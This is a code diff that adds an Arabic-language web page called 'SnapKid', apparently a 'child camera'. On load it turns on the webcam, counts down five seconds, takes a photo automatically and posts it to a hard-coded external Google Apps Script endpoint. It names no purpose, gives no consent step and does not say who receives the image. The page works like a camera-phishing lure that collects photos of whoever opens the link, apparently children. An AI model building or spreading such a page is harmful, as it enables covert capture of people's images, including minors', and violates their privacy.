@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>كاميرا الطفل — SnapKid</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding-top: 30px; }
+    #countdown { font-size: 2em; margin-top: 20px; }
+  </style>
+</head>
+<body>
+
+  <h2>📸 سيتم التقاط صورة خلال:</h2>
+  <div id="countdown">5</div>
+  <video id="video" autoplay playsinline width="320"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+  <p id="status"></p>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const status = document.getElementById('status');
+    const countdownElem = document.getElementById('countdown');
+    const scriptUrl = 'https://script.google.com/macros/s/AKfycbykLRoEJE1LcYV1SoYfMQIg-YUeCWTYwuuA45rsTVEll342sIEI15mLICtUZ9ZoF83x/exec';
+    
+    // تشغيل الكاميرا
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { status.textContent = 'خطأ في تشغيل الكاميرا: ' + err.message; });
+
+    // عد تنازلي 5 ثواني
+    let count = 5;
+    const timer = setInterval(() => {
+      count--;
+      countdownElem.textContent = count;
+      if (count === 0) {
+        clearInterval(timer);
+        takePhoto();
+      }
+    }, 1000);
+
+    function takePhoto() {
+      status.textContent = 'جاري التقاط الصورة...';
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const imgData = canvas.toDataURL('image/png');
+
+      status.textContent = 'جاري إرسال الصورة...';
+      fetch(scriptUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imgData })
+      })
+      .then(resp => resp.text())
+      .then(() => {
+        status.textContent = '✅ تمّ إرسال الصورة! شكراً 😊';
+      })
+      .catch(err => {
+        status.textContent = '‼️ فشل إرسال الصورة: ' + err.message;
+      });
+    }
+  </script>
+
+</body>
+</html>
